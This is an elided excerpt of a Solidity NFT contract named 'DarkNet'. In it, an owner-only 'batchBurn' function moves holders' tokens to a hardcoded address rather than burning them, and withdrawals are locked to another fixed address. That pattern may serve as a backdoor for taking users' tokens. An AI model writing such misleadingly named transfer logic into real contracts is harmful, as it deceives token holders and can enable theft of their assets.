...
contract DarkNet is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("DarkNet", "DN", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xe404D0F5b901e0962c4B1597B92a44B7121294fA, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xef957a238c7A4D718F8D976dCe8CD507Ecf44F05);
